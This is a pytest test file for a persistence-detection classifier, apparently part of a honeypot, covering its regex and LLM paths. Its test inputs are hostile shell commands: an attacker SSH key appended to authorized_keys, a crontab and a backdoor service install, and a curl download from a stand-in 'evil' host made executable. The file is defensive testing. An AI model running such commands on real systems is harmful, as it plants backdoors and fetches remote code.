"""Tests for the Stage 10 slice 1 :class:`PersistenceClassifier`.

Slice 10.1 ships the regex-only hot path; the LLM pass arrives in
slice 10.3. These tests pin the classifier's pre-LLM contract:
regex match -> :class:`PersistenceEvent`, miss -> :data:`None`,
constructor validates ``budget_cap_tokens``.
"""

from __future__ import annotations

import pytest

from anglerfish.persistence import PersistenceClassifier


async def test_classify_returns_event_on_authorized_keys_install() -> None:
    classifier = PersistenceClassifier(client=None)
    command = "echo 'ssh-ed25519 AAAA attacker' >> /root/.ssh/authorized_keys"
    event = await classifier.classify(command, cwd="/root")
    assert event is not None
    assert event.kind == "authorized_keys"
    assert event.source == "regex"


async def test_classify_returns_event_on_crontab_install() -> None:
    classifier = PersistenceClassifier(client=None)
    event = await classifier.classify(
        "echo '0 * * * * /tmp/.x' | crontab -",
        cwd="/root",
    )
    assert event is not None
    assert event.kind == "crontab"
    assert event.payload == "0 * * * * /tmp/.x"


async def test_classify_returns_event_on_systemctl_install() -> None:
    classifier = PersistenceClassifier(client=None)
    event = await classifier.classify(
        "systemctl enable backdoor.service",
        cwd="/root",
    )
    assert event is not None
    assert event.kind == "systemctl"
    assert event.sub_key == "backdoor"


async def test_classify_returns_none_on_unrelated_command() -> None:
    classifier = PersistenceClassifier(client=None)
    assert await classifier.classify("ls -la /etc", cwd="/root") is None
    assert await classifier.classify("cat /etc/passwd", cwd="/root") is None


async def test_classify_returns_none_on_empty_command() -> None:
    classifier = PersistenceClassifier(client=None)
    assert await classifier.classify("", cwd="/root") is None


async def test_classify_does_not_call_llm_when_regex_matches() -> None:
    """A regex hit must short-circuit before any LLM logic runs.

    Slice 10.1 has no LLM pass yet, so this is asserted indirectly
    by passing ``client=None`` + ``llm_enabled=True``: a regex hit
    must NOT raise an AttributeError on the None client.
    """
    classifier = PersistenceClassifier(client=None, llm_enabled=True)
    event = await classifier.classify(
        "echo 'ssh-ed25519 AAAA attacker' >> ~/.ssh/authorized_keys",
        cwd="/root",
    )
    assert event is not None


def test_constructor_rejects_zero_budget_cap_tokens() -> None:
    with pytest.raises(ValueError, match="budget_cap_tokens"):
        PersistenceClassifier(client=None, budget_cap_tokens=0)


def test_constructor_accepts_llm_enabled_false() -> None:
    """Operator-disabled LLM pass is a supported construction."""
    classifier = PersistenceClassifier(client=None, llm_enabled=False)
    # No assertion: this test pins that construction succeeds.
    assert classifier is not None


async def test_classify_returns_none_on_regex_silent_no_llm_wired() -> None:
    """Regex-silent command + no client wired -> None (no LLM pass available).

    Slice 10.3 added the LLM branch; this test confirms the branch
    gracefully no-ops when ``client=None`` is passed. Operators who
    disable engaged_persistence or run without a fast-tier LLM see
    this path.
    """
    classifier = PersistenceClassifier(client=None)
    # Curl + chmod is a classic regex-silent persistence shape
    # (downloads a payload + makes it executable). Without a wired
    # LLM client the classifier returns None instead of throwing.
    event = await classifier.classify(
        "curl http://evil/x -o /tmp/.x && chmod +x /tmp/.x",
        cwd="/root",
    )
    assert event is None


async def test_classify_returns_none_when_llm_disabled() -> None:
    """llm_enabled=False short-circuits before any LLM call would fire."""
    # Note: we pass client=None too; the test pins that even a hypothetical
    # client never gets called when llm_enabled=False.
    classifier = PersistenceClassifier(client=None, llm_enabled=False)
    event = await classifier.classify(
        "curl http://evil/x -o /tmp/.x && chmod +x /tmp/.x",
        cwd="/root",
    )
    assert event is None


async def test_classify_returns_none_on_pure_read_command_even_with_llm() -> None:
    """looks_write_shape gates the LLM branch; ls never calls LLM."""

    class _FailingClient:
        async def structured_chat(self, *args, **kwargs):  # type: ignore[no-untyped-def]
            del args, kwargs
            raise AssertionError("LLM branch must not fire on read-only command")

    classifier = PersistenceClassifier(client=_FailingClient())  # type: ignore[arg-type]
    event = await classifier.classify("ls -la /etc", cwd="/root")
    assert event is None


# ---------------------------------------------------------------------------
# Slice 10.3: LLM branch
# ---------------------------------------------------------------------------


class _MockStructuredChatClient:
    """Stand-in for LLMClient that records calls + returns a fixed payload."""

    def __init__(self, payload: dict[str, object] | None) -> None:
        self._payload = payload
        self.calls: list[tuple[object, ...]] = []

    async def structured_chat(  # type: ignore[no-untyped-def]
        self,
        messages,
        schema,
        *,
        role,
        budget,
    ):
        from anglerfish.persistence.classifier import _LLMClassifierPayload

        self.calls.append((messages, schema, role, budget))
        assert schema is _LLMClassifierPayload
        if self._payload is None:
            return _LLMClassifierPayload(is_persistence=False)
        return _LLMClassifierPayload(**self._payload)  # type: ignore[arg-type]


async def test_llm_branch_fires_on_write_shape_regex_miss() -> None:
    """A write-shape command that misses regex triggers structured_chat."""
    client = _MockStructuredChatClient(
        {
            "is_persistence": True,
            "kind": "crontab",
            "sub_key": None,
            "payload": "0 * * * * /tmp/.beacon",
        },
    )
    classifier = PersistenceClassifier(client=client)  # type: ignore[arg-type]
    # Curl-then-chmod is a regex miss but is_write_shape=True via "chmod ".
    event = await classifier.classify(
        "curl https://evil/x -o /tmp/.x && chmod +x /tmp/.x",
        cwd="/root",
    )
    assert event is not None
    assert event.source == "llm"
    assert event.kind == "crontab"
    assert event.payload == "0 * * * * /tmp/.beacon"
    assert len(client.calls) == 1


async def test_llm_branch_returns_none_on_is_persistence_false() -> None:
    """LLM says 'not persistence' -> classify returns None."""
    client = _MockStructuredChatClient(None)  # default payload: is_persistence=False
    classifier = PersistenceClassifier(client=client)  # type: ignore[arg-type]
    event = await classifier.classify(
        "tee /tmp/notes.txt < /tmp/scratch",
        cwd="/root",
    )
    assert event is None
    assert len(client.calls) == 1


async def test_llm_branch_returns_none_on_incomplete_payload() -> None:
    """is_persistence=True but missing kind/payload -> treated as miss."""
    client = _MockStructuredChatClient(
        {"is_persistence": True, "kind": None, "sub_key": None, "payload": None},
    )
    classifier = PersistenceClassifier(client=client)  # type: ignore[arg-type]
    event = await classifier.classify(
        "chmod +x /tmp/.x",
        cwd="/root",
    )
    assert event is None


async def test_llm_branch_wraps_llm_error_as_classifier_error() -> None:
    """LLM-layer errors raise PersistenceClassifierError, not the raw type."""
    from anglerfish.llm.errors import OllamaUnavailableError
    from anglerfish.persistence.classifier import PersistenceClassifierError

    class _RaisingClient:
        async def structured_chat(self, *args, **kwargs):  # type: ignore[no-untyped-def]
            del args, kwargs
            raise OllamaUnavailableError("connection refused")

    classifier = PersistenceClassifier(client=_RaisingClient())  # type: ignore[arg-type]
    with pytest.raises(PersistenceClassifierError, match="connection refused"):
        await classifier.classify("chmod +x /tmp/.x", cwd="/root")


async def test_llm_branch_does_not_fire_when_disabled() -> None:
    """llm_enabled=False short-circuits even on write-shape commands."""

    class _FailingClient:
        async def structured_chat(self, *args, **kwargs):  # type: ignore[no-untyped-def]
            del args, kwargs
            raise AssertionError("LLM branch must not fire when disabled")

    classifier = PersistenceClassifier(
        client=_FailingClient(),  # type: ignore[arg-type]
        llm_enabled=False,
    )
    event = await classifier.classify("chmod +x /tmp/.x", cwd="/root")
    assert event is None


async def test_regex_hit_short_circuits_before_llm() -> None:
    """A regex hit returns immediately; no LLM call fires."""

    class _CountingClient:
        def __init__(self) -> None:
            self.calls = 0

        async def structured_chat(self, *args, **kwargs):  # type: ignore[no-untyped-def]
            del args, kwargs
            self.calls += 1
            raise AssertionError("LLM branch should not fire on regex hit")

    client = _CountingClient()
    classifier = PersistenceClassifier(client=client)  # type: ignore[arg-type]
    event = await classifier.classify(
        "echo 'ssh-ed25519 AAAA attacker' >> ~/.ssh/authorized_keys",
        cwd="/root",
    )
    assert event is not None
    assert event.source == "regex"
    assert client.calls == 0
